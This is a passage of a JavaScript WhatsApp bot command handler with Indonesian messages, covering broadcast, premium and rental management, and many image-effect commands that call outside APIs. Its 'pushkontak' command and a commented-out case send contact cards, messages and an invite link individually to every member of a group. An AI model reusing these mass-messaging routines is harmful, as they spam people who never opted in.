juna.sendMessage(apaan, {video: buffer, caption: txt, mimetype: 'video/mp4', duration: 909090909}, {quoted: fkontak})
}
m.reply('Sukses Broadcast')
}
break
case 'bcaudio': case 'bcaud':{
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!/audio/.test(mime)) return m.reply(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: false, duration: 909090909}, {quoted: fkontak})
}
m.reply('Sukses Broadcast')
}
break
case 'bcvn': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!/audio/.test(mime)) return m.reply(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: true, duration: 909090909}, {quoted: fkontak})
}
m.reply('Sukses Broadcast')
}
break
case 'bcstiker': case 'bcstik': case 'bcsticker':{
if (!isCreator) return m.reply(mess.OnlyOwner)
 if (!/webp/.test(mime)) return m.reply(`Reply stiker dengan caption ${prefix + command}`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {sticker :{url : media}}, {quoted: fkontak})
}
m.reply('Sukses Broadcast')
}
break
case 'bc': case 'broadcast': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!text) return m.reply (`Contoh : ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let todd = await juna.reSize(`${setting.pathimg}`, 300, 300) 
m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let apaan of anu) {
await sleep(1500)
juna.sendMessage(apaan, {image: { url: setting.pathimg }, caption: `*BROADCAST*\n\n${text}`})
}
m.reply('Sukses Broadcast')
}
break
case 'pushkontak': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Hanya bisa digunakan di dalam grup')
var name = text.split('|')[0]
var chet = text.split('|')[1]
if (!name) return m.reply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} juna|sv uy udh gw sv back`) 
if (!chet) return m.reply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} juna|sv uy udh gw sv back`) 
let kontk = {
displayName: "Contact",
contacts: [{
displayName: name,
vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + name + ";;;\nFN:" + name + "\nitem1.TEL;waid=" + m.sender.split('@')[0] + ":" + m.sender.split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
}]
}
let pkDetect = await juna.groupMetadata(m.chat)
if (pkDetect.participants.length > 200) return m.reply('Batas member maksimal; 200')
m.reply('Gasken pushkontak total member ' + pkDetect.participants.length + ' member')
for (let a of pkDetect.participants) {
juna.sendMessage(a.id, {
contacts: kontk
})
await sleep(500)
juna.sendMessage(a.id, {
text: chet,
contextInfo:
{
"externalAdReply": {
"title": botName, 
"body": `Ijin Pushkontak Om`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: instagram, 
thumbnailUrl: pathimg, 
}
}
})
await sleep(500)
} // (?); kirim pesan ke semua peserta grup
m.reply('Group: *' + pkDetect.subject + '*\nMember: ' + pkDetect.participants.length + '\ndelay: 500\nBERHASIL PUSH')
	}
break
/*case 'halooo': {
if (!isCreator) return
if (!m.isGroup) return
let pkDetect = await juna.groupMetadata(m.chat)
if (pkDetect.participants.length > 200) return
for (let a of pkDetect.participants) {
juna.sendMessage(a.id, {
text: `https://chat.whatsapp.com/FI9chamB0d4F40PLS98lmA\n\nIzin bang, jangan lupa gabung, ada botnya 🗿🙏`,
contextInfo:
{
"externalAdReply": {
"title": botName, 
"body": `Bot WhatsApp Official`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: instagram, 
thumbnailUrl: pathimg, 
}
}
})
await sleep(5000)
} // (?); kirim pesan ke semua peserta grup
	}
break*/
case 'delchat':
//if (!isCreator) return m.reply(mess.OnlyOwner)
var teks = q ? q : m.chat
await juna.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, teks)
m.reply('Sukses!')
break
case'bcsewa': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!text) return m.reply (`Contoh : ${prefix + command} Tes`)
addCountCmd('bcsewa', m.sender, _cmd)
for (let i of sewa){
await juna.sendMessage(i.id, { text: text })
await sleep(3000) 
}
m.reply(`Sukses bc ke ${sewa.length}`)
}
break
case'addprem':{
if (!isCreator) return m.reply(mess.OnlyOwner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return m.reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return m.reply(`Mau yang berapa hari?`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : pcknm.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('addprem', m.sender, _cmd)
_prem.addPremiumUser(users, atnm, premium)
m.reply('Sukses')
} else {
var cekap = await juna.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('addprem', m.sender, _cmd)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
}}
break
case'delprem':
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!args[0]) return m.reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
} else {
var cekpr = await juna.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
}
break
case'addsewa':
if (!isCreator) return m.reply(mess.OnlyOwner)
if (text < 2) return m.reply(`Gunakan dengan cara ${prefix+command} *linkgc waktu*\n\nContoh : ${prefix+command} https://chat.whatsapp.com/PnwpPqn0b 30d`)
if (!isUrl(args[0])) return m.reply(mess.error.Iv)
var url = args[0]
addCountCmd('addsewa', m.sender, _cmd)
url = url.split('https://chat.whatsapp.com/')[1]
if (!text) return m.reply(`Waktunya?`)
var data = await juna.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(data, sewa)) return m.reply(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(data, args[1], sewa)
m.reply(`Success Add Sewa Group Berwaktu!`)
break
case'delsewa':
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!m.isGroup) return m.reply(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
if (!isSewa) return m.reply(`Bot tidak disewa di Grup ini`)
addCountCmd('delsewa', m.sender, _cmd)
sewa.splice(_sewa.getSewaPosition(args[0] ? args[0] : m.chat, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
m.reply(`Sukses`)
break
case'resetlimit':
if (!isCreator) return m.reply(mess.OnlyOwner)
addCountCmd('resetlimit', m.sender, _cmd)
limit = []
fs.writeFileSync('./database/limit.json', JSON.stringify(limit, null, 2))
glimit = []
fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit, null, 2))
m.reply(`Sukses reset limit pengguna`)
break
case'halloween2':case'horror':case'game8bit':case'layered':case'glitch2':case'coolg':case'coolwg':case'realistic':case'space3d':case'gtiktok':case'stone':case'marvel':case'marvel2':case'pornhub':case'avengers':case'metalr':case'metalg':case'metalg2':case'lion':case'wolf_bw':case'wolf_g':case'ninja':case'3dsteel':case'horror2':case'lava':case'bagel':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let texproo = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${m1}&text2=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: texproo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(util.format(err))
})
}
break
case 'glitch2': case 'harrypot': case 'graffiti': case 'pornhub': case 'glitch3': case '3dspace': case 'lion': case 'wolf': case 'retro': case '8bit': {
 if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
 let link
 if (/glitch3/.test(command)) link = 'https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html'
 if (/harrypot/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
 if (/graffiti/.test(command)) link = 'https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html'
 if (/pornhub/.test(command)) link = 'https://textpro.me/pornhub-style-logo-online-generator-free-977.html'
 if (/glitch2/.test(command)) link = 'https://textpro.me/create-a-glitch-text-effect-online-free-1026.html'
 if (/3dspace/.test(command)) link = 'https://textpro.me/create-space-3d-text-effect-online-985.html'
 if (/lion/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
 if (/wolf/.test(command)) link = 'https://textpro.me/create-wolf-logo-galaxy-online-936.html'
 if (/retro/.test(command)) link = 'https://textpro.me/create-3d-retro-text-effect-online-free-1065.html'
 if (/8bit/.test(command)) link = 'https://textpro.me/video-game-classic-8-bit-text-effect-1037.html'
 let anu = await maker.double_text_create(link, [`${m1}`,`${m2}`])
 try{
 juna.sendMessage(m.chat, {image: anu, caption: "TextPro 2 ✅"}, {quoted: m})
 } catch (err) {
 m.reply('Terjadi Kesalahan!')
 }
 }
 break
//photooxy menu
case'photooxymenu':{
if (!text) return m.reply(`▢━━「 *PHOTOOXY* 」━━▢

⌬〡 *${prefix}shadow*
⌬〡 *${prefix}write*
⌬〡 *${prefix}romantic*
⌬〡 *${prefix}burnpaper*
⌬〡 *${prefix}smoke*
⌬〡 *${prefix}narutobanner*
⌬〡 *${prefix}love*
⌬〡 *${prefix}undergrass*
⌬〡 *${prefix}doublelove*
⌬〡 *${prefix}coffecup*
⌬〡 *${prefix}underwaterocean*
⌬〡 *${prefix}smokyneon*
⌬〡 *${prefix}starstext*
⌬〡 *${prefix}rainboweffect*
⌬〡 *${prefix}balloontext*
⌬〡 *${prefix}metalliceffect*
⌬〡 *${prefix}embroiderytext*
⌬〡 *${prefix}flamingtext*
⌬〡 *${prefix}stonetext*
⌬〡 *${prefix}writeart*
⌬〡 *${prefix}summertext*
⌬〡 *${prefix}wolfmetaltext*
⌬〡 *${prefix}nature3dtext*
⌬〡 *${prefix}rosestext*
⌬〡 *${prefix}naturetypography*
⌬〡 *${prefix}quotesunder*
⌬〡 *${prefix}shinetext*`)
}
break

case'battlegrounds-logo': case'battlefield4': case'text-8bit':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let photooxy = await getBuffer(`https://api.zeeoneofc.my.id/api/photooxy/${command}?text=${m1}&text2=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: photooxy, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(util.format(err))
})
}
break
//photooxy menu
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Contoh : ${prefix+command} Yahya`) 
m.reply(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
try {
await juna.sendMessage(m.chat, { image: { url: dehe }, caption: `PhotoOxy Maker`}, { quoted: m})
} catch (err) {
m.reply('Terjadi Kesalahan!')
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
//logomaker
case'avataroverwatch': case'logoaccording': case'mascotstyle': case'letterlogos':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|thumb*\n*Untuk List Thumb Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|thumb*\n*Untuk List Thumb Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&thumb=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listavataroverwatch': {
if (!text) return m.reply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *mccree*
│2 ▸ *mercy*
│3 ▸ *zenyatta*
│4 ▸ *zarya*
│5 ▸ *winston*
│6 ▸ *widowmaker*
│7 ▸ *tracer*
│8 ▸ *torbjorn*
│9 ▸ *symmetra*
│10 ▸ *sombra*
│11 ▸ *soldier76*
│12 ▸ *soldier_76*
│13 ▸ *roadhog*
│14 ▸ *reinhardt*
│15 ▸ *reaper2*
│16 ▸ *reaper*
│17 ▸ *pharah*
│18 ▸ *orisa*
│19 ▸ *mei*
│20 ▸ *lucio*
│21 ▸ *junkrat*
│22 ▸ *hanzo*
│23 ▸ *genji*
│24 ▸ *dva*
│25 ▸ *bastion*
│26 ▸ *ana2*
│27 ▸ *ana*
│28 ▸ *doomfist*
│29 ▸ *bg-1*
│
╰────────────˧`)
}
break
case'listlogoaccording': {
if (!text) return m.reply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *bear2*
│2 ▸ *cat2*
│3 ▸ *ceberus*
│4 ▸ *crocodile*
│5 ▸ *dinosaur*
│6 ▸ *dragon3*
│7 ▸ *eagle3*
│8 ▸ *horse2*
│9 ▸ *husky*
│10 ▸ *kraken*
│11 ▸ *lynx*
│12 ▸ *sabertooh*
│13 ▸ *assassin*
│14 ▸ *bee*
│15 ▸ *cat*
│16 ▸ *demon*
│17 ▸ *fox-2*
│18 ▸ *gorilla*
│19 ▸ *horus*
│20 ▸ *octopus*
│21 ▸ *rounin*
│22 ▸ *-2*
│23 ▸ *tiger-3*
│24 ▸ *bg-tiger*
│25 ▸ *bg-buffalo*
│26 ▸ *chicken*
│27 ▸ *bull*
│28 ▸ *bg-wolf*
│29 ▸ *jaguar*
│30 ▸ *horse*
│31 ▸ *eagle*
│32 ▸ *dragon*
│33 ▸ *wolver*
│34 ▸ *shark*
│35 ▸ *sabertooth*
│36 ▸ *rhino*
│37 ▸ *phoenix*
│38 ▸ *lion*
│39 ▸ *hornet*
│40 ▸ *griffin*
│41 ▸ *bear*
│42 ▸ *tiger2*
│43 ▸ *panther*
│44 ▸ *owl*
│45 ▸ *monkey*
│46 ▸ *goat*
│47 ▸ *fox*
│48 ▸ *dragon2*
│49 ▸ *devil*
│50 ▸ *cobra*
│51 ▸ *reaper*
│52 ▸ *pirates*
│53 ▸ *owl2*
│54 ▸ *mask*
│55 ▸ *eagle2*
│56 ▸ *fire*
│57 ▸ *neptune*
│58 ▸ *chamois*
│59 ▸ *parrots*
│60 ▸ *samurai*
│
╰────────────˧`)
}
break
case'listmascotstyle': {
if (!text) return m.reply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *dragon-5*
│2 ▸ *jet*
│3 ▸ *skull-3*
│4 ▸ *skull-cyborg*
│5 ▸ *tiger-4*
│6 ▸ *bee-3*
│7 ▸ *dragon-4*
│8 ▸ *fox-3*
│9 ▸ *goat-2*
│10 ▸ *kitsune*
│11 ▸ *octopus-2*
│12 ▸ *piranha*
│13 ▸ *assassin*
│14 ▸ *wolf*
│15 ▸ *bear-2*
│16 ▸ *cat*
│17 ▸ *ceberus*
│18 ▸ *crocodile*
│19 ▸ *dinosaur*
│20 ▸ *dragon-3*
│21 ▸ *eagle-3*
│22 ▸ *horse-2*
│23 ▸ *husky*
│24 ▸ *kraken*
│25 ▸ *lynx*
│26 ▸ *sabertooh*
│27 ▸ *sabertooth*
│28 ▸ *shark*
│29 ▸ *tiger*
│30 ▸ *tiger2*
│31 ▸ *tiger3*
│32 ▸ *skull2*
│33 ▸ *scorpion*
│34 ▸ *rounin*
│35 ▸ *octopus*
│36 ▸ *horus*
│37 ▸ *gorilla*
│38 ▸ *fox*
│39 ▸ *demon*
│40 ▸ *cat2*
│41 ▸ *bee*
│42 ▸ *dragon*
│43 ▸ *dragon2*
│44 ▸ *owl*
│45 ▸ *eagle*
│46 ▸ *goat*
│47 ▸ *griffin*
│48 ▸ *horse*
│49 ▸ *hornet*
│50 ▸ *lion*
│51 ▸ *panther*
│52 ▸ *phoenix*
│53 ▸ *puma*
│54 ▸ *rooster*
│55 ▸ *rhino*
│56 ▸ *bee2*
│57 ▸ *devil*
│58 ▸ *cobra*
│59 ▸ *bull*
│60 ▸ *bear*
│61 ▸ *monkey*
│62 ▸ *warrior*
│63 ▸ *rabbit*
│64 ▸ *pirates*
│65 ▸ *owl2*
│66 ▸ *neonwolf*
│67 ▸ *lionking*
│68 ▸ *godzilla*
│69 ▸ *flashwolf*
│70 ▸ *fire*
│71 ▸ *eagle2*
│72 ▸ *dog*
│73 ▸ *mask*
│74 ▸ *team*
│75 ▸ *pubg*
│76 ▸ *drift*
│
╰────────────˧`)
}
break
case'listletterlogos': {
if (!text) return m.reply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *a*
│2 ▸ *b*
│3 ▸ *c*
│4 ▸ *d*
│5 ▸ *e*
│6 ▸ *f*
│7 ▸ *g*
│8 ▸ *h*
│9 ▸ *i*
│10 ▸ *j*
│11 ▸ *k*
│12 ▸ *l*
│13 ▸ *m*
│14 ▸ *n*
│15 ▸ *o*
│16 ▸ *p*
│17 ▸ *q*
│18 ▸ *r*
│19 ▸ *s*
│20 ▸ *t*
│21 ▸ *u*
│22 ▸ *v*
│23 ▸ *w*
│24 ▸ *x*
│25 ▸ *y*
│26 ▸ *z*
│
╰────────────˧`)
}
break

case'bannerofpubg': case'bannerofapex': case'bannerofoverwatch': case'banneroffreefire': case'gunlogogaming': case'companylogo': case'companylogo2': case'teamlogo':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|background*\n*Untuk List Background Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|background*\n*Untuk List Background Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&background=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listbannerofpubg': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *bg1*
│2 ▸ *bg2*
│3 ▸ *bg3*
│4 ▸ *bg4*
│5 ▸ *bg5*
│6 ▸ *bg6*
│7 ▸ *bg7*
│8 ▸ *bg8*
│9 ▸ *bg9*
│10 ▸ *bg10*
│11 ▸ *bg11*
│
╰────────────˧`)
}
break
case'listbannerofapex': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *bg1*
│2 ▸ *bg2*
│3 ▸ *bg3*
│4 ▸ *bg4*
│5 ▸ *bg5*
│6 ▸ *bg6*
│
╰────────────˧`)
}
break
case'listbannerofoverwatch': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *widowmaker*
│2 ▸ *tracer*
│3 ▸ *symmetra*
│4 ▸ *sombra*
│5 ▸ *soldier76*
│6 ▸ *reinhardt*
│7 ▸ *reaper*
│8 ▸ *orisa*
│9 ▸ *mercy*
│10 ▸ *mei*
│11 ▸ *genji*
│12 ▸ *dva*
│13 ▸ *doomfist*
│14 ▸ *ashe*
│15 ▸ *ana*
│
╰────────────˧`)
}
break
case'listbanneroffreefire': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *andrew*
│2 ▸ *kelly*
│3 ▸ *caroline*
│4 ▸ *laura*
│5 ▸ *maxim*
│6 ▸ *miguel*
│7 ▸ *misha*
│8 ▸ *moco*
│9 ▸ *nikita*
│10 ▸ *notora*
│11 ▸ *olivia*
│12 ▸ *steffi*
│
╰────────────˧`)
}
break
case'listgunlogogaming': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *ak47*
│2 ▸ *ak47-s*
│3 ▸ *an94*
│4 ▸ *ar15*
│5 ▸ *aug*
│6 ▸ *awm*
│7 ▸ *g36k*
│8 ▸ *m4a1*
│9 ▸ *m4-s*
│10 ▸ *m14ebr*
│11 ▸ *m16*
│12 ▸ *m60*
│13 ▸ *m82a1*
│14 ▸ *mp5*
│15 ▸ *scar*
│16 ▸ *svd*
│17 ▸ *xm8*
│18 ▸ *xm1014*
│
╰────────────˧`)
}
break
case'listcompanylogo2': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *1*
│2 ▸ *2*
│3 ▸ *3*
│4 ▸ *4*
│5 ▸ *5*
│6 ▸ *6*
│7 ▸ *7*
│8 ▸ *8*
│9 ▸ *9*
│10 ▸ *10*
│11 ▸ *11*
│12 ▸ *12*
│13 ▸ *13*
│14 ▸ *14*
│15 ▸ *15*
│16 ▸ *16*
│17 ▸ *17*
│18 ▸ *18*
│
╰────────────˧`)
}
break
case'listcompanylogo': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *1*
│2 ▸ *2*
│3 ▸ *3*
│4 ▸ *4*
│5 ▸ *5*
│6 ▸ *6*
│7 ▸ *7*
│8 ▸ *8*
│9 ▸ *9*
│10 ▸ *10*
│11 ▸ *11*
│12 ▸ *12*
│13 ▸ *13*
│14 ▸ *14*
│15 ▸ *15*
│16 ▸ *16*
│17 ▸ *17*
│18 ▸ *18*
│19 ▸ *19*
│20 ▸ *20*
│21 ▸ *21*
│22 ▸ *22*
│23 ▸ *23*
│24 ▸ *24*
│25 ▸ *25*
│26 ▸ *26*
│
╰────────────˧`)
}
break
case'listteamlogo': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *cobra*
│2 ▸ *dragon*
│3 ▸ *eagle*
│4 ▸ *eagle2*
│5 ▸ *falcon*
│6 ▸ *bear*
│7 ▸ *lion*
│8 ▸ *lion2*
│9 ▸ *buffalo*
│10 ▸ *tiger*
│11 ▸ *tiger2*
│12 ▸ *wolf*
│
╰────────────˧`)
}
break

case'pencilsketch':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|icon*\n*Untuk List Icon Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|icon*\n*Untuk List Icon Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&icon=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listpencilsketch': {
if (!text) return m.reply(`╭─▸ *LIST ICON*
│
├❖ *LIST*
│1 ▸ *bird*
